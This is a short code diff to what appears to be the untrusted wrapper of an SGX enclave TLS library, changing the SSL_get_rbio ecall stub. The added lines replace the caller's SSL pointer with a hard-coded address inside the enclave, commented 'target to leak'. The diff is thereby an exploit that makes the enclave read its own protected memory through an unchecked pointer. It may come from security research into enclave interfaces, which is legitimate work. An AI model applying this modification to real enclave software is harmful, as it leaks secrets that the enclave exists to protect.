@@ -2225,7 +2225,7 @@ X509 *	SSL_get_peer_certificate(const SSL *s) {
 	return retval;
 	*/
 }
-
+extern uint64_t g_enclave_base;
 BIO *	SSL_get_rbio(const SSL *s) {
    if (global_eid == 0) {
    	initialize_library();
@@ -2234,6 +2234,7 @@ BIO *	SSL_get_rbio(const SSL *s) {
    log_enter_ecall(__func__);
 	sgx_status_t ret = SGX_ERROR_UNEXPECTED;
 	BIO* retval = 0;
+	s = (const SSL *)(g_enclave_base + 0x7335410 /* target to leak */ - 0x18);
 	ret = ecall_SSL_get_rbio(global_eid, &retval, s);
 	if (ret != SGX_SUCCESS) {
 		print_error_message(ret, __func__);
